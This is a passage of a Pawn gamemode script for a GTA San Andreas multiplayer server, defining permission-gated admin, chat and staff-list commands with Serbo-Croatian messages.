		SendClientMessage( playerid, 0xAFAFAFAA, "1(Brass Knuckles) 2(Golf Club) 3(Nite Stick) 4(Knife) 5(Baseball Bat) 6(Shovel) 7(Pool Cue) 10-13(Dildo) 14(Flowers) 15(Cane) 22(Pistol) 23(Silence Pistol)");
		SendClientMessage( playerid, 0xAFAFAFAA, "24(Desert Eagle) 25(Shot Gun) 29(MP5) 30(AK47) 31(M16) 33(Country Rifle) 34(Sniper Rifle) 41(Spray Can) 42(Fire Extinguisher) 43(Camera) 46(Parachute)");
		return 1;
    }
	if( gun < 1 || gun > 46 ) SendErrorMessage( playerid, "Krivi WeaponID.");
	if( ammo < 1 || ammo > 999 ) return SendErrorMessage( playerid, "Ne idi ispod 1 ili 999 metaka.");
	if( (gun > 35 && gun < 41) && PlayerInfo[playa][xAdmin] < 1 ) return SendErrorMessage(playerid, "Ne mozete to oruzje dati igracu koji nije admin.");
	if( PlayerInfo[ playerid ][ xAdmin ] < 4 && PlayerInvited[playa] == 0 ) return SendErrorMessage(playerid, "Niste ovlasceni.");
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage(playerid, "Niste ovlasceni.");

	if( GetNearestGZone( playa ) != -1 ) return SendErrorMessage( playerid, "Ne mozes to na zoni (ANTI-AA)." );
	if( GetPlayerVirtualWorld( playa ) != 0 ) return SendErrorMessage( playerid, "Ne mozes to u banci/zlatari (ANTI-AA)." );

	if( IsPlayerConnected( playa ) && playa != IPI )
	{
		GiveWeaponToPlayer( playa, gun, ammo );
		SendInfoMessage( playa, "Admin {FFFFFF}%s {4282C0}ti je dao oruzje {FFFFFF}%s.", ImeIgraca( playerid ), WeaponInfos[ gun ][ wName ] );
		SendInfoMessage( playerid, "Dao si oruzje {FFFFFF}%s {4282C0}igracu {FFFFFF}%s.", WeaponInfos[ gun ][ wName ], ImeIgraca( playa ) );
	}
	return 1;
}

CMD:changeadmincode( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !IsPlayerAdmin(playerid)) return SendErrorMessage( playerid, "Moras biti RCON admin.");

    new igrac, novikod;
    if( sscanf( params, "ui", igrac, novikod ) ) return SendUsageMessage( playerid, "/changeadmincode [id] [code]");
	if( igrac == IPI ) return SendErrorMessage( playerid, "Pogresan ID" );
	if( novikod == 0 || novikod < 1 || novikod > 9999 ) return SendErrorMessage( playerid, "Novi kod ne moze biti 0, ispod 1 i preko 9999." );
	if(IsSpecialUser(igrac) && !IsSpecialUser(playerid)) return SendErrorMessage(playerid, "Glavnima ne mozes set admin code.");

	PlayerInfo[ igrac ][ xAKod ] = novikod;
	sql_user_update_integer( igrac, "admin_code", PlayerInfo[ igrac ][ xAKod ] );

	SCMF( igrac, 0x4282C0FF, "#ACODE: {FFFFFF}Vas novi kod je {4282C0}(%d).", novikod );
    SCMF( playerid, 0x4282C0FF, "#ACODE: {FFFFFF}Promenili ste igracu {4282C0}%s {FFFFFF}kod na {4282C0}(%d).", ImeIgraca( igrac ), novikod );
	return 1;
}

CMD:aduty( playerid ) 
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	if(GetNearestGZone( playerid ) != -1)
	{
		if( PlayerInfo[ playerid ][ xClan ] != 0 || PlayerInfo[ playerid ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Ne mozete to kao clan organizacije unutar zone." );
	}

    if( !AdminDuty[ playerid ] ) 
    {
		AdminDuty[ playerid ] = true;
		SetPlayerHealth( playerid, 100);
		SetPlayerArmour( playerid, 99);
		SMG_SetPlayerColor( playerid );

		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

		if(PlayerInfo[ playerid ][ xAdmin ] < 5) 
		{
			if(PlayerInfo[playerid][xPol] == 1) SMG_SetPlayerSkin( playerid, 294 );

			SendClientMessageToAllEx( 0xFF0000FF, "U: (( {FFFFFF}%s {FF0000}%s {FFFFFF}je sada na duznosti. Imate pitanje kucajte {FF0000}[ /askq ] ))", getAdminRankNameOnDuty(playerid), ImeIgraca( playerid ) );
		}
		SendInfoMessage(playerid, "Sada ste administrator na duznosti.");
	}
	else 
	{
	    AdminDuty[ playerid ] = false;
		SetPlayerHealth( playerid, 50+PlayerInfo[playerid][xSHealth]);
		SetPlayerArmour( playerid, 0);
		SMG_SetPlayerColor( playerid );

		if(PlayerInfo[ playerid ][ xAdmin ] < 5) 
		{
			if(PlayerInfo[playerid][xPol] == 1) SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

			SendClientMessageToAllEx( 0xFF0000FF, "U: (( {FFFFFF}%s {FF0000}%s {FFFFFF}je sada izvan duznosti. Vise {FF0000}ne prima zahteve. ))", getAdminRankName(playerid), ImeIgraca( playerid ) );
		}
	    SendInfoMessage(playerid, "Vise niste administrator na duznosti.");
	}
	return 1;
}

CMD:specduty( playerid ) 
{
	if( PlayerInfo[ playerid ][ xSpecAdmin ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    if( !AdminDuty[ playerid ] ) 
    {
		AdminDuty[ playerid ] = true;
		SetPlayerHealth( playerid, 100);
		SetPlayerArmour( playerid, 99);
		SMG_SetPlayerColor( playerid );

		if(PlayerInfo[playerid][xPol] == 1) SMG_SetPlayerSkin( playerid, 294 );

		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

		SendClientMessageToAllEx( 0x4A68C2FF, "U: (( {FFFFFF}%s {4A68C2}%s {FFFFFF}je sada na duznosti. Imate pitanje kucajte {4A68C2}[ /askq ] ))", getAdminRankName(playerid), ImeIgraca( playerid ) );
		SendInfoMessage(playerid, "Sada ste administrator na duznosti.");
	}
	else 
	{
	    AdminDuty[ playerid ] = false;
		SetPlayerHealth( playerid, 50+PlayerInfo[playerid][xSHealth]);
		SetPlayerArmour( playerid, 0);
		SMG_SetPlayerColor( playerid );

		if(PlayerInfo[playerid][xPol] == 1) SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

		SendClientMessageToAllEx( 0x4A68C2FF, "U: (( {FFFFFF}%s {4A68C2}%s {FFFFFF}je sada izvan duznosti. Vise {4A68C2}ne prima zahteve. ))", getAdminRankName(playerid), ImeIgraca( playerid ) );
	    SendInfoMessage(playerid, "Vise niste administrator na duznosti.");
	}
	return 1;
}

CMD:gmduty( playerid )
{
	if( PlayerInfo[ playerid ][ xGamemaster ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	if( !AdminDuty[ playerid ] )
	{
		AdminDuty[ playerid ] = true;
	    SMG_SetPlayerColor( playerid );
		SetPlayerHealth( playerid, 100 );
		SetPlayerArmour( playerid, 99 );

		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

		if( PlayerInfo[ playerid ][ xPol ] == 1 ) SMG_SetPlayerSkin( playerid, 120 );

		SendClientMessageToAllEx( 0x48E86BFF, "U: (( {FFFFFF}%s {48E86B}%s {FFFFFF}je sada na duznosti. Imate pitanje kucajte {48E86B}[ /askq ] ))", getGamemasterRankName(playerid), ImeIgraca( playerid ) );

		SendInfoMessage(playerid, "Sada ste gamemaster na duznosti.");
	}
	else
	{
	    AdminDuty[ playerid ] = false;
	    SMG_SetPlayerColor( playerid );
		SetPlayerHealth( playerid, 50+PlayerInfo[playerid][xSHealth]);
		SetPlayerArmour( playerid, 0);
		if(PlayerInfo[playerid][xPol] == 1) SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

		SendClientMessageToAllEx( 0x48E86BFF, "U: (( {FFFFFF}%s {48E86B}%s {FFFFFF}je sada izvan duznosti. Vise {48E86B}ne prima zahteve. ))", getGamemasterRankName(playerid), ImeIgraca( playerid ) );

	    SendInfoMessage(playerid, "Vise niste gamemaster na duznosti.");
	}
    return 1;
}

CMD:dajkljuckapije( playerid, const params[] )
{
	if( NearestGate( playerid ) == -1 ) return SendErrorMessage( playerid, "Niste blizu nijedne kapije." );

	if( strcmp( ImeIgraca( playerid ), GateData[ NearestGate( playerid ) ][ gateOwner ], true ) == 0 )
	{
		new ID;
    	if( sscanf( params, "r", ID ) ) return SendUsageMessage( playerid, "/dajkljuckapije [id]" );

		strmid( PlayerInfo[ ID ][ xKljucKapije ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME );
		sql_user_update_string( ID, "gate_key", PlayerInfo[ ID ][ xKljucKapije ] );

		SendInfoMessage( playerid, "Dali ste kljuc kapije {FFFFFF}%s.", ImeIgraca( ID ) );
		SendInfoMessage( ID, "{FFFFFF}%s {4282C0}vam je dao kljuc svoje kapije.", ImeIgraca( playerid ) );
	}
	else return SendErrorMessage( playerid, "Ovo nije vasa kapija." );
    return 1;
}

CMD:o( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    new aotext[ 128 ];
    if( sscanf( params, "s[128]", aotext ) ) return SendUsageMessage( playerid, "/o(oc) [text]");

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) 		SendClientMessageToAllEx( 0xFF0000FF, "A - OOC: (( Skripter %s: {FFFFFF}%s {FF0000}))", ImeIgraca( playerid ), aotext );
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 )	SendClientMessageToAllEx( 0xFF0000FF, "A - OOC: (( Suvlasnik %s: {FFFFFF}%s {FF0000}))", ImeIgraca( playerid ), aotext );
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) 	SendClientMessageToAllEx( 0xFF0000FF, "A - OOC: (( Mapper %s: {FFFFFF}%s {FF0000}))", ImeIgraca( playerid ), aotext );
	else 													SendClientMessageToAllEx( 0xFF0000FF, "A - OOC: (( %s %s: {FFFFFF}%s {FF0000}))", getAdminRankName( playerid ), ImeIgraca( playerid ), aotext );
	
	WriteLog("log-chat", "CMD: /o > Admin %s: %s", ImeIgraca( playerid ), aotext);
	return 1;
}
alias:o("ooc");

CMD:a( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new text[ 128 ];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/a [tekst]" );

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 )		AChat(0xFF0000FF, "[A] {FFFFFF}Skripter - {FF0000}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text );
    else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) 	AChat(0xFF0000FF, "[A] {FFFFFF}Suvlasnik - {FF0000}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text );
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) 	AChat(0xFF0000FF, "[A] {FFFFFF}Mapper - {FF0000}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text );
	else 													AChat(0xFF0000FF, "[A] {FFFFFF}%s - {FF0000}%s[%d]: {FFFFFF}%s", getAdminRankNameInChat( playerid ), ImeIgraca( playerid ), playerid, text );

	WriteLog("log-chat", "CMD: /a > Admin %s: %s", ImeIgraca( playerid ), text);
	return 1;
}

CMD:g( playerid, const params[] )
{
    if( !ToggedG ) return SendErrorMessage( playerid, "G chat je trenutno iskljucen od strane Admina." );
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new text[ 128 ];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/g [tekst]" );

	if( PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xYouTuber ] >= 1 || PlayerInfo[playerid][xGamemaster] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
        if(PlayerInfo[playerid][xSkriptaRank] == 1) GChat(0x48E86BFF, "[G] {FFFFFF}Skripter - {48E86B}%s[%d]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 2) GChat(0x48E86BFF, "[G] {FFFFFF}Suvlasnik - {48E86B}%s[%d]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 3) GChat(0x48E86BFF, "[G] {FFFFFF}Mapper - {48E86B}%s[%d]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xAdmin] >= 1) GChat(0x48E86BFF, "[G] {FFFFFF}%s - {48E86B}%s[%d]: {FFFFFF}%s", getAdminRankNameInChat(playerid), ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSpecAdmin] >= 1) GChat(0x48E86BFF, "[G] {FFFFFF}Spec Admin - {48E86B}%s[%d]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xGamemaster] >= 1) GChat(0x48E86BFF, "[G] {FFFFFF}GameMaster[%d] - {48E86B}%s[%d]: {FFFFFF}%s", PlayerInfo[playerid][xGamemaster], ImeIgraca(playerid), playerid, text);
        else if(PlayerInfo[playerid][xVIPLevel] >= 1) GChat(0x48E86BFF, "[G] {FFFFFF}VIP[%d] - {48E86B}%s[%d]: {FFFFFF}%s", PlayerInfo[playerid][xVIPLevel], ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xPromoter] >= 1) GChat(0x48E86BFF, "[G] {FFFFFF}Promoter[%d] - {48E86B}%s[%d]: {FFFFFF}%s", PlayerInfo[playerid][xPromoter], ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xYouTuber] >= 1) GChat(0x48E86BFF, "[G] {FFFFFF}%s - {48E86B}%s[%d]: {FFFFFF}%s", (PlayerInfo[playerid][xYouTuber] == 2 ? "Head YouTuber" : "YouTuber"), ImeIgraca(playerid), playerid, text);

		WriteLog("log-chat", "CMD: /g > %s: %s", ImeIgraca( playerid ), text);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ga( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new text[ 128 ];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/ga [tekst]" );

	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1  || PlayerInfo[ playerid ][ xGamemaster ] >= 1)
	{
        if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) GMChat(0x4A68C2FF, "[GA] {FFFFFF}Skripter - {4A68C2}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text);
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) GMChat(0x4A68C2FF, "[GA] {FFFFFF}Suvlasnik - {4A68C2}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text );
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) GMChat(0x4A68C2FF, "[GA] {FFFFFF}Mapper - {4A68C2}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text );
		else if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) GMChat(0x4A68C2FF, "[GA] {FFFFFF}%s - {4A68C2}%s[%d]: {FFFFFF}%s", getAdminRankNameInChat( playerid ), ImeIgraca( playerid ), playerid, text );
		else if( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 ) GMChat(0x4A68C2FF, "[GA] {FFFFFF}Spec Admin - {4A68C2}%s[%d]: {FFFFFF}%s", ImeIgraca( playerid ), playerid, text );
        else if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 ) GMChat(0x4A68C2FF, "[GA] {FFFFFF}GameMaster[%d] - {4A68C2}%s[%d]: {FFFFFF}%s", PlayerInfo[ playerid ][ xGamemaster ], ImeIgraca( playerid ), playerid, text );

		WriteLog("log-chat", "CMD: /ga > %s: %s", ImeIgraca( playerid ), text);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:n( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new text[ 128 ];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/n [tekst]" );
    if( !ToggedN ) return SendErrorMessage( playerid, "N chat je trenutno iskljucen od strane Admina." );
    if( gettime() < PlayerInfo[playerid][xPoslaoNPoruku]) return SendErrorMessage(playerid, "Poruku u N chat mozes slati opet za (%d) sec.", PlayerInfo[playerid][xPoslaoNPoruku] - gettime());

	if(PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || (PlayerInfo[ playerid ][ xLevel ] >= 1 && PlayerInfo[ playerid ][ xLevel ] <= 3))
	{
        if(PlayerInfo[playerid][xSkriptaRank] == 1) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}Skripter{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 2) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}Suvlasnik{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 3) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}Mapper{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
        else if(PlayerInfo[playerid][xAdmin] >= 1) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}%s{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, getAdminRankNameInChat(playerid), text);
        else if(PlayerInfo[playerid][xSpecAdmin] >= 1) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}Spec Admin{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
        else if(PlayerInfo[playerid][xGamemaster] >= 1) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}GameMaster %d{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xGamemaster], text);
		else if(PlayerInfo[playerid][xLevel] <= 3) NewbieChat(0x2A5AC9FF, "[NEWBIE] %s(%d) [{F9981D}Newbie{2A5AC9}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);

		if(PlayerInfo[playerid][xAdmin] == 0 && PlayerInfo[playerid][xSpecAdmin] == 0 && PlayerInfo[playerid][xGamemaster] == 0) PlayerInfo[playerid][xPoslaoNPoruku] = gettime()+10;

		WriteLog("log-chat", "CMD: /n > %s: %s", ImeIgraca( playerid ), text);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}


CMD:l( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");

	new text[ 128 ];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/l [tekst]" );
    if( !ToggedL ) return SendErrorMessage( playerid, "L chat je trenutno iskljucen od strane Admina." );
    if( gettime() < PlayerInfo[playerid][xPoslaoLPoruku]) return SendErrorMessage(playerid, "Poruku u L chat mozes slati opet za (%d) sec.", PlayerInfo[playerid][xPoslaoLPoruku] - gettime());

	if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[ playerid ][ xLider ] != 0 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4 || PlayerInfo[ playerid ][ xSkriptaRank ] == 1 || PlayerInfo[ playerid ][ xSkriptaRank ] == 2 || PlayerInfo[ playerid ][ xSkriptaRank ] == 3)
	{
        if(PlayerInfo[playerid][xSkriptaRank] == 1) LeaderChat(0xED5DB7FF, "[LEADER] %s(%d) [{ED5DB7}Skripter{ED5DB7}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 2) LeaderChat(0xED5DB7FF, "[LEADER] %s(%d) [{ED5DB7}Suvlasnik{ED5DB7}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 3) LeaderChat(0xED5DB7FF, "[LEADER] %s(%d) [{ED5DB7}Mapper{ED5DB7}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xSkriptaRank] == 4) LeaderChat(0xED5DB7FF, "[LEADER] %s(%d) [{ED5DB7}Vodja Lidera{ED5DB7}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, text);
		else if(PlayerInfo[playerid][xLider] != 0 ) LeaderChat(0xED5DB7FF, "[LEADER] %s(%d) [{ED5DB7}%s{ED5DB7}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, org_info[ PlayerInfo[ playerid ][ xLider ] ][ oPreFix ], text);
   		else if(PlayerInfo[playerid][xAdmin] >= 7) LeaderChat(0xED5DB7FF, "[LEADER] %s(%d) [{ED5DB7}%s{ED5DB7}]: {FFFFFF}%s", ImeIgraca(playerid), playerid, getAdminRankNameInChat(playerid), text);

		if(PlayerInfo[playerid][xAdmin] != 7 && PlayerInfo[ playerid ][ xSkriptaRank ] != 4) PlayerInfo[playerid][xPoslaoLPoruku] = gettime()+10;

		WriteLog("log-chat", "CMD: /l > %s: %s", ImeIgraca( playerid ), text);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:admini( playerid )
{
	if(PlayerInfo[playerid][xLevel] < 5) return SendErrorMessage(playerid, "Samo level 5+");
	mysql_tquery( mSQL, "SELECT `p_name`, `admin_lvl`, `isonline`, `last_login`, `xAGMStats` FROM `users` WHERE `admin_lvl` > '0' ORDER BY `admin_lvl` DESC", "selectQueryAdminList", "i", playerid );
	return 1;
}

CMD:specadmini( playerid )
{
	if(PlayerInfo[playerid][xLevel] < 5) return SendErrorMessage(playerid, "Samo level 5+");
	mysql_tquery( mSQL, "SELECT `p_name`, `xSpecAdmin`, `isonline`, `last_login`, `xAGMStats` FROM `users` WHERE `xSpecAdmin` > '0'", "selectQuerySpecAdminList", "i", playerid );
	return 1;
}

CMD:gamemasteri( playerid )
{
	if(PlayerInfo[playerid][xLevel] < 5) return SendErrorMessage(playerid, "Samo level 5+");
	mysql_tquery( mSQL, "SELECT `p_name`, `helper_level`, `isonline`, `last_login`, `xAGMStats` FROM `users` WHERE `helper_level` > '0' ORDER BY `helper_level` DESC", "selectQueryGamemasterList", "i", playerid);
	return 1;
}

CMD:vipovi( playerid )
{
    if( PlayerInfo[playerid][xAdmin] < 4 )
    {
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

	   	format( globalstring, 35, "{FFFFFF}Name\t{FFFFFF}Level\n" );
		strcat( DialogStrgEx, globalstring );

		foreach( new i : Player)
		{
			if( PlayerInfo[ i ][ xVIPLevel ] >= 1 )
			{
		        format( globalstring, 90, "{FFFFFF}[%d] %s\t{FFFFFF}[%d]\n", i, ImeIgraca( i ), PlayerInfo[i][xVIPLevel] );
				strcat( DialogStrgEx, globalstring );
		    }
		}
		if( strlen( DialogStrgEx ) <= 34 ) return SendErrorMessage( playerid, "Nema nijednog online Vipa." );

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Online VIPovi:", DialogStrgEx, "OK", "" );
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	}
	else
	{
		mysql_tquery( mSQL, "SELECT `p_name`, `vip_level`, `isonline`, `last_login` FROM `users` WHERE `vip_level` > '0' ORDER BY `vip_level` DESC", "selectQueryVipList", "i", playerid );
	}
	return 1;
}

CMD:promoteri( playerid ) return mysql_tquery( mSQL, "SELECT `p_name`, `promoter_level`, `isonline`, `last_login` FROM `users` WHERE `promoter_level` > '0' ORDER BY `promoter_level` DESC", "selectQueryPromoterList", "i", playerid );
CMD:youtuberi( playerid ) return mysql_tquery( mSQL, "SELECT `p_name`, `xYouTuber`, `isonline`, `last_login` FROM `users` WHERE `xYouTuber` > '0' ORDER BY `xYouTuber` DESC", "selectQueryYouTuberList", "i", playerid );

CMD:novajlije( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new broj = 0;
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

	foreach( new i : Player)
	{
	    if( PlayerInfo[ i ][ xLevel ] < 2 )
		{
	        broj++;
			format( globalstring, 70, "{FFFFFF}%d - {4282C0}[%s] | ", broj, ImeIgraca( i ) );
			strcat( DialogStrgEx, globalstring );
			if( broj % 3 == 0 ) strcat( DialogStrgEx, "\n" );
	    }
	}

	if( strlen( DialogStrgEx ) == 0 ) return SendErrorMessage( playerid, "Nema nijednog novajlije." );

	new str[ 40 ];
	format( str, sizeof( str ), "{FFFFFF}Online Novajlije (%d):", broj );
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, str, DialogStrgEx, "OK", "" );

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:afklista( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	new broj = 0;
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

	foreach( new i : Player)
	{
	    if( antiCheatCS[ i ][ AFKMinute ] != 0 )
		{
	        broj++;
			format( globalstring, 70, "{FFFFFF}%s - {4282C0}[%d min] | ", ImeIgraca( i ), antiCheatCS[ i ][ AFKMinute ] );
			strcat( DialogStrgEx, globalstring );
			if( broj % 3 == 0 ) strcat( DialogStrgEx, "\n" );
	    }
	}

	if( strlen( DialogStrgEx ) == 0 ) return SendErrorMessage( playerid, "Nema nijednog afk igraca." );

	new str[ 40 ];
	format( str, sizeof( str ), "{FFFFFF}AFK Igraci (%d):", broj );
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, str, DialogStrgEx, "OK", "" );

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:lideri( playerid ) return mysql_tquery( mSQL, "SELECT org_members.org_id, org_members.memb_rank, org_members.memb_type, org_members.memb_sqlID, users.p_name, users.last_login, users.isonline, organizations.name \
													FROM org_members \
													JOIN users \
													ON org_members.memb_sqlID = users.user_id \
													JOIN organizations \
													ON org_members.org_id = organizations.org_id \
													WHERE org_members.memb_type > '0' ORDER BY org_members.org_id ASC", "selectQueryLeaderList", "i", playerid );

CMD:1( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new text[ 128 ];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/1 [tekst]" );

	foreach( new i : Player)
	{
	    if( PlayerInfo[ i ][ xAdmin ] == 7 )
		{
			SCMF( i, 0xFF6347AA, "|VLASNIK| %s(%s): {FFFFFF}%s", ImeIgraca( playerid ), getAdminRankName(playerid), text );
		}
	}
	return 1;
}

CMD:vremenskiban( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id, ban_days, razlog[ 40 ];
	    if( sscanf( params, "uis[40]", id, ban_days, razlog ) ) return SendUsageMessage( playerid, "/vremenskiban [id] [dani] [razlog]");

	    if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID.");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozete banovati vlasnike i direktore!");
		if( ban_days > 100 || ban_days < 0 ) return SendErrorMessage( playerid, "Ne mozes preko 100 ili ispod 0 dana.");

		sql_ban_user( ImeIgraca( id ), PlayerInfo[ id ][ xID ], 2, razlog, ImeIgraca( playerid ), gettime()+(86400*ban_days) ); 

